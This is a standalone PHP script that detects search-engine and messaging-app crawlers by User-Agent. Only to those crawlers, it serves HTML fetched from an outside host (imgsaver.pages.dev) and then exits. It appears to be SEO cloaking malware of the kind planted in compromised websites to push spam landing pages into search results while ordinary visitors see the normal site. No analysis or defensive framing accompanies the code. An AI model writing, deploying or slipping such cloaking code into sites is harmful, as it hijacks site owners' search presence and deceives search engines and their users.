<?php

function is_bot(): bool {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }

    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    $bots = [
        'googlebot',
        'google-cws',
        'telegrambot',
        'bingbot',
        'google-site-verification',
        'google-inspectiontool',
        'ahrefsbot'
    ];

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

if (is_bot()) {

    $url = 'https://imgsaver.pages.dev/landingpages.txt';

    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'header'  => "User-Agent: Mozilla/5.0\r\n"
        ]
    ]);

    $message = @file_get_contents($url, false, $context);

    if ($message !== false) {
        header('Content-Type: text/html; charset=UTF-8');
        echo $message;
    } else {
        http_response_code(503);
        echo 'Service temporarily unavailable.';
    }

    exit;
}
?>
